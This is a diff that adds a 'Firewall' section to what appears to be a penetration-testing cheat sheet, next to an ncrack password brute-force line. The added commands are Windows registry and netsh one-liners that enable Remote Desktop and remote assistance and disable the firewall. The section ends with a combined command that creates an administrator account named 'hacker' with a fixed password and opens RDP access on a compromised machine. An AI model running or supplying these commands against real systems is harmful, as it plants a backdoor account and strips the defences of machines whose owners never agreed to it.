@@ -287,6 +287,29 @@ On victim machine:
 <b>Ncrack</b> (FTP, SSH, TELNET, HTTP(S), POP3(S), SMB, RDP, VNC)
 
 	ncrack -U <[USERS_LIST]> -P <[PASSWORDS_LIST]> ftp://<[IP]>
+	
+# Firewall
+
+<b>Enable Remote Desktop:</b>
+
+	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+	netsh firewall set service remotedesktop enable
+
+<b>Enable Remote assistance:</b>
+
+	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+
+	netsh firewall set service remoteadmin enable
+
+<b>Disable firewall:</b>
+
+	netsh firewall set opmode disable
+
+<b>One shot ninja combo (New User, Firewall Off + RDP):</b>
+
+	set CMD "net user hacker Hacker123 /add & net localgroup administrators hacker /add & net localgroup \"Remote Desktop Users\" 	hacker /add & reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall set opmode disable"
+
 
 
 
